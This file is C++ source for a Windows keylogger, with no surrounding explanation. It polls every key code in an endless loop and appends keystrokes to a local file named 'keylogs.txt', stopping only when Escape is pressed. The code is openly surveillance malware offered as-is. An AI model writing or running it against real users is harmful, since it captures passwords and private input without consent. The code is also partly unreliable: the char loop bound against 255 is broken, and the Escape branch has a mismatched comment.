#include <iostream>
#include <fstream>
#include <windows.h>
using namespace std;

int main()
{
    ofstream file;
    file.open("keylogs.txt", ios::app); // Open the file in append mode

    char key;
    while (true)
    {
        Sleep(10); // Sleep for 10 milliseconds
        for (key = 8; key <= 255; key++)
        { // Iterate over all possible key codes
            if (GetAsyncKeyState(key) == -32767)
            { // Check if the key is pressed
                if (key == VK_RETURN)
                { // If the key is the enter key, add a new line
                    file << endl;
                }
                else if (key == VK_SPACE)
                { // If the key is the space key, add a space
                    file << " ";
                }
                else if (key == VK_BACK)
                { // If the key is the backspace key, remove the last character
                    file << "\b";
                }
                else if (key == VK_ESCAPE)
                { // If the key is the backspace key, remove the last character
                    file.close();
                    return 0;
                }
                

                else
                { // Otherwise, add the key to the log
                    file << char(key);
                }
            }
        }
    }
}
